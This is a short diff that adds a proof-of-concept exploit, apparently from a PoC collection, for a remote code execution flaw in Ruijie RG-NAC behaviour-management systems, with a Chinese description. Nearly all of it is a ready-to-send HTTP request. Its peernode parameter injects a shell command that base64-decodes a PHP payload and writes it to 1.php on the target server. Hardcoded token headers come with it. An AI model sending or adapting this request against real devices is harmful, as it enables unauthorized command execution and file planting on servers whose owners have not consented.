@@ -1,0 +1,9 @@
+# 锐捷RG-NAC统一上网行为管理与审计系统远程代码执行漏洞
+# 锐捷RG-NAC统一上网行为管理与审计系统存在远程代码执行漏洞，攻击者可以利用漏洞执行命令获取控制服务器
+GET /view/vpn/autovpn/online_check.php?acid=80051545&peernode=%20%7C%20%60echo%20PD9waHAgcGhwaW5mbygpOw==%20%7C%20base64%20-d%20%3E%201.php%60&bid=hd_tag_m8mv2464 HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv2464
+RM-PRO-Token: 5d00812264a6808787b55499cd84642d
+RM-PRO-Time: 1742808365672
+User-Agent: curl/7.83.1
+
